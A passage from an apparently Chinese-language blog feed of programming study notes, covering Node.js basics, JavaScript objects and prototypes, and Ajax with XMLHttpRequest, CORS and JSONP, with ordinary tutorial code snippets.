DIRT(Data-Intensive Real-Time Application)</h4><p>JavaScript没有标准的I/O库，而I/O库在服务端语言中是十分常见的。Node通过重新实现常用“host”对象，尽可能地保持和浏览器之间的一致性。比如web api(Timer API (setTimeout…)、Console API (console.log))<br>考虑我们在之前举的请求一个本地资源的例子，在Node中可以这样实现：  </p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'./resource.json'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>er<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>另一个例子是Node创建各种类型的服务器是非常便捷的，一个简单的HTTP服务器例子如下：  </p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'text/plain'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'Hello World\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Server running at http://localhost:3000/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Node同时接受数据流。可以把数据流当成一个数据，但数据不是根据空间分布而是根据时间分布。通过数据分块处理，我们可以当数据接收时开始处理数据而不是等待所有数据接收完毕。  </p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> stream <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">createReadStream</span><span class="token punctuation">(</span><span class="token string">'./resource.json'</span><span class="token punctuation">)</span>stream<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>stream<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'finished'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="Sumary"><a href="#Sumary" class="headerlink" title="Sumary"></a>Sumary</h4><ul><li>Node是基于JavaScript建立的</li><li>Node是事件驱动和异步的</li><li>Node针对数据敏感的实时的应用</li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面向对象的程序设计</title>
      <link href="/2018/08/26/mian-xiang-dui-xiang-de-cheng-xu-she-ji/"/>
      <url>/2018/08/26/mian-xiang-dui-xiang-de-cheng-xu-she-ji/</url>
      
        <content type="html"><![CDATA[<h3 id="理解对象"><a href="#理解对象" class="headerlink" title="理解对象"></a>理解对象</h3><h4 id="对象的属性类型"><a href="#对象的属性类型" class="headerlink" title="对象的属性类型"></a>对象的属性类型</h4><ul><li>数据属性<ul><li>Configurable：能否通过<code>delete</code>删除属性从而重新定义属性，默认为<code>true</code>；一旦吧属性定义为不可配置的，则不能在把它变回配置</li><li>Enumerable：能否通过<code>for in</code>循环返回属性，默认为<code>true</code></li><li>Writable：能否修改属性的值，默认为<code>true</code></li><li>Value：包含这个属性的数据值，默认为<code>undefined</code></li></ul></li><li>ECMAScript5的<strong>Object.defineProperty()</strong>方法<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> person <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>person<span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>  writable<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  configurable<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  value<span class="token punctuation">:</span> <span class="token string">"Nicholas"</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>访问器属性<ul><li>Configurable：能否通过<code>delete</code>删除属性从而重新定义属性，默认为<code>false</code></li><li>Enumerable：能否通过<code>for-in</code>循环返回属性</li><li>Get：在读取属性时调用的函数，默认为<code>undefined</code></li><li>Set：在写入属性时调用的函数，默认为<code>undefined</code></li></ul></li><li>getter和setter函数<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> book <span class="token operator">=</span> <span class="token punctuation">{</span>  _year<span class="token punctuation">:</span> <span class="token number">2004</span><span class="token punctuation">,</span>  edition<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>book<span class="token punctuation">,</span> <span class="token string">"year"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>  <span class="token keyword">get</span><span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_year<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//使用访问器属性的常用方法，即设置一个属性的值会导致其他属性的变化</span>  <span class="token keyword">set</span><span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>newValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>newValue <span class="token operator">></span> <span class="token number">2004</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>_year <span class="token operator">=</span> newValue<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>edition <span class="token operator">+</span><span class="token operator">=</span> newValue <span class="token operator">-</span> <span class="token number">2004</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li><li>定义多个属性<strong>Object.defineProperties</strong><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> book <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>Object<span class="token punctuation">.</span><span class="token function">defineProperties</span><span class="token punctuation">(</span>book<span class="token punctuation">,</span> <span class="token punctuation">{</span>  _year<span class="token punctuation">:</span> <span class="token punctuation">{</span>    writable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    value<span class="token punctuation">:</span> <span class="token number">2004</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  edition<span class="token punctuation">:</span> <span class="token punctuation">{</span>    writable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    value<span class="token punctuation">:</span> <span class="token number">1</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  year<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token keyword">get</span><span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_year<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token keyword">set</span><span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>newValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>newValue <span class="token operator">></span> <span class="token number">2004</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>_year <span class="token operator">=</span> newValue<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>edition <span class="token operator">+</span><span class="token operator">=</span> newValue <span class="token operator">-</span> <span class="token number">2004</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li><li>读取属性的特性<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> descriptor <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyDescriptor</span><span class="token punctuation">(</span>book<span class="token punctuation">,</span> <span class="token string">"year"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>descriptor<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>descriptor<span class="token punctuation">.</span>configurable<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><h4 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h4><p>抽象了创建具体对象的过程，用函数来封装以特定接口创建对象的细节：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">createPerson</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">,</span> job<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  o<span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>  o<span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>  o<span class="token punctuation">.</span>job <span class="token operator">=</span> job<span class="token punctuation">;</span>  o<span class="token punctuation">.</span>sayName <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> o<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token function">createPerson</span><span class="token punctuation">(</span><span class="token string">"Susie"</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token string">"Software Engineer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="构造函数模式"><a href="#构造函数模式" class="headerlink" title="构造函数模式"></a>构造函数模式</h4><p>直接将属性和方法赋值给<code>this</code>对象，没有<code>return</code>语句</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">,</span> job<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>job <span class="token operator">=</span> job<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> person2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Jane"</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token string">"Teacher"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li>实例拥有一个构造器<code>constructor</code>属性指向<code>Person</code><ul><li>person1.constructor == Person // true</li><li>person1 instanceof Person // true</li><li>person1 instanceof Object // true</li></ul></li><li>调用方式<ul><li>当作构造函数使用，必须使用<code>new</code>创建实例</li><li>当作普通函数使用：对象的属性和方法添加到全局<code>window</code></li><li>在另一个对象的作用域使用<code>Person.call(o, &quot;Karen&quot;, 25, &quot;Singer&quot;)</code></li></ul></li><li>缺陷<ul><li>每个方法都需要在实例上重新创建一次</li></ul></li></ul><h4 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h4><p>我们创建的每个函数都有一个<code>prototype</code>(原型)属性，这个属性是一个指针，指向一个对象，而这个对象的用途就是包含可以由特定类型的所有实例共享的属性和方法。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>Person<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"Jane"</span><span class="token punctuation">;</span>Person<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">29</span><span class="token punctuation">;</span>Person<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>job <span class="token operator">=</span> <span class="token string">"Teacher"</span><span class="token punctuation">;</span>Person<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>sayName <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li><strong>prototype</strong>指向函数的原型对象</li><li>原型对象的<strong>constructor</strong>指向原函数，即构造函数；原型对象默认只会取得 constructor 属性，其他方法是从 Object 继承的</li><li>每个对象/实例都有一个<strong><strong>proto</strong></strong>属性，指向构造函数的<strong>原型对象</strong><ul><li><code>Person.prototype.isPrototypeOf(person1)</code> - true</li><li><code>Object.getPrototypeOf(person1) == Person.prototype</code> - true</li><li><code>person1 instanceof Person</code> = true</li></ul></li><li>实例同名属性会覆盖原型属性</li><li>可以通过对象实例访问保存在原型中的值，但不能通过对象实例改写原型中的值</li></ul><h4 id="原型与in操作符"><a href="#原型与in操作符" class="headerlink" title="原型与in操作符"></a>原型与in操作符</h4><ul><li><strong>hasOwnProperty()</strong>：当传入的值字符串是对象中的属性时返回<code>true</code>，可以通过这个方法确定什么时候访问的是实例属性，什么时候访问的是原型属性</li><li><strong>in</strong>：操作符会在通过对象能够访问给定属性时返回<code>true</code>，无论该属性存在于实例还是原型中</li><li>通过上面两个方法，可以确定对象是存在与原型还是对象中：<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">hasPrototypeProperty</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token operator">!</span>object<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>name <span class="token keyword">in</span> object<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>要取得对象上所有可枚举的实例属性，可以使用ECMAScript5的<code>Object.keys()</code>方法，这个方法接收一个对象作为参数，返回一个包含所有可枚举属性的字符串数组:<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> keys <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Person<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span></code></pre></li><li>要得到实例的所有属性，无论是否可枚举，可以使用<code>Object.getOwnPropertyName()</code>方法</li></ul><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><ul><li>ECMAScript中继承主要是依靠原型链来实现的，其基本思想是利用原型让一个引用类型继承另一个引用类型的属性和方法</li><li><strong>构造函数、原型和实例的关系</strong>：每个构造函数都有一个原型对象，原型对象都包含一个指向构造函数的指针，而每个实例都包含一个指向原型对象的内部指针</li></ul><h4 id="this"><a href="#this" class="headerlink" title="this"></a>this</h4><ul><li>this表示当前对象，如果在全局作用范围内使用<code>this</code>则指代当前页面对象window；如果在函数中使用<code>this</code>，则<code>this</code>是根据运行时此函数在什么对象上调用决定的</li><li>可以使用<code>apply</code>和<code>call</code>两个全局方法来改变函数中<code>this</code>的具体指向，但是参数定义不同：<ul><li>apply：新的this对象和数组参数</li><li>call：可以接受多个参数</li></ul></li><li>闭包的特性：当一个内部函数被外部函数的变量引用时，就产生了一个闭包，闭包不但包括被返回的函数，还包括这个函数的定义环境。主要实现嵌套的回调函数和隐藏对象细节。闭包是指有权访问另一个函数作用域中的变量的函数。创建闭包的常见方式就是在一个函数内部创建另一个函数。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 对象 </tag>
            
            <tag> 原型 </tag>
            
            <tag> 继承 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ajax详解</title>
      <link href="/2018/08/24/ajax-xiang-jie/"/>
      <url>/2018/08/24/ajax-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li>《JavaScript高级程序设计（第三版）》</li><li><img src="http://www.ruanyifeng.com/blog/2016/04/cors.html" alt="跨域资源共享 CORS 详解"></li></ul><h4 id="XMLHttpRequest对象"><a href="#XMLHttpRequest对象" class="headerlink" title="XMLHttpRequest对象"></a>XMLHttpRequest对象</h4><ul><li><p>创建(支持IE7之前的版本)</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">createXHR</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> XMLHttpRequest <span class="token operator">!=</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> ActiveXObject <span class="token operator">!=</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>activeXString <span class="token operator">!=</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> versions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"MSXML2.XMLHttp.6.0"</span><span class="token punctuation">,</span><span class="token string">"MSXML2.XMLHttp.3.0"</span><span class="token punctuation">,</span><span class="token string">"MSXML2.XMLHttp"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> len<span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> len <span class="token operator">=</span> versions<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>          <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span>versions<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>activeXString <span class="token operator">=</span> versions<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>activeXString<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"No XHR object available."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li><p>用法</p><ul><li><strong>open()</strong>：三个参数，要发送的参数类型，请求的URL和是否异步发送请求的布尔值。open不会真正发送请求，二是启动一个请求以备发送。</li><li><strong>send()</strong>：可选的一个参数，要作为请求主体发送的数据，如果不需要通过请求主体发送数据，则必须传入null;</li><li>响应属性<ul><li><strong>responseText</strong>：作为响应主体被返回的文本</li><li><strong>responseXML</strong>：如果响应的内容类型是<code>text/xml</code>或者<code>application/xml</code>，这个属性将保存包含这响应数据的XML DOM文档</li><li><strong>status</strong>：相应的HTTP状态</li><li><strong>statusText</strong>：HTTP状态的说明</li></ul></li><li>异步<strong>readyState</strong>属性<ul><li>0：未初始化，尚未调用open方法</li><li>1：启动，调用open方法，未调用send方法</li><li>2：发送，已调用send方法，未接收到响应</li><li>3：接收，接收到部分响应数据</li><li>4：完成，已接收到全部响应数据，可以在客户端使用</li></ul></li><li>HTTP头部信息<ul><li><strong>setRequestHeader(“name”, “value”)</strong></li><li><strong>getResponseHeader(“name”)</strong></li><li><strong>getAllResponseHeaders()</strong></li></ul></li></ul></li><li><p>例子</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token function">createXHR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>status <span class="token operator">>=</span> <span class="token number">200</span> <span class="token operator">&amp;&amp;</span> xhr<span class="token punctuation">.</span>status <span class="token operator">&lt;</span> <span class="token number">300</span><span class="token punctuation">)</span> <span class="token operator">||</span> xhr<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">304</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Request was unsuccessfull: "</span> <span class="token operator">+</span> xhr<span class="token punctuation">.</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">,</span> <span class="token string">"expamle.txt"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>GET请求(参数编码)<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">addURLParam</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> name<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  url <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">?</span> <span class="token string">"?"</span> <span class="token punctuation">:</span> <span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  url <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> url<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>POST请求(数据序列化)</li><li><strong>FormData</strong>：FormData为序列化表单以及创建与表单格式相同的数据提供了便利，可以任意添加多个键值对，或者直接传入表单元素<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>data<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"Jane"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span>form<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><strong>overrideMimeType()</strong>：重写XHR响应的MIME类型</li></ul><h4 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h4><ul><li>跨域资源共享(CORS) 是一种机制，它使用额外的 HTTP 头来告诉浏览器  让运行在一个 origin (domain) 上的Web应用被准许访问来自不同源服务器上的指定的资源。当一个资源从与该资源本身所在的服务器不同的域、协议或端口请求一个资源时，资源会发起一个跨域 HTTP 请求。</li><li>原因：出于浏览器的同源策略限制，浏览器会拒绝跨域请求；如果两个页面拥有相同的协议（protocol），端口（port）和主机（host），那么这两个页面就属于同一个源（origin）；</li><li><strong>JSONP</strong></li><li><strong>CORS</strong>：如果浏览器发现请求是一个一个简单请求，就自动在头信息之中，添加一个Origin字段，如果浏览器认为这个请求可以接受，就在<code>Access-Control-Allow-Origin</code>头部中回发相同源信息(如果是公共资源，可以回发<code>*</code>)<ul><li>简单请求需满足两个条件：<br><img src="/img/in-post/cors-00.JPG" alt="阮一峰"></li><li><code>Access-Control-Allow-Origin</code>：该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求</li><li><code>Access-Control-Allow-Credentials</code>：该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器</li><li><code>Access-Control-Expose-Headers</code>：XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定</li><li>CORS与JSONP的使用目的相同，但是比JSONP更强大；JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</li></ul></li><li><strong>IE对CORS的支持</strong><ul><li>IE8引入了XDR(XDomainRequest)类型，XDR与XHR的不同：<ul><li>cookie不会随请求发送</li><li>只能设置头部信息中的<code>Content-Type</code>字段</li><li>不能访问响应头部信息</li><li>只支持<code>GET</code>和<code>POST</code></li></ul></li></ul></li><li>跨浏览器的CORS<pre 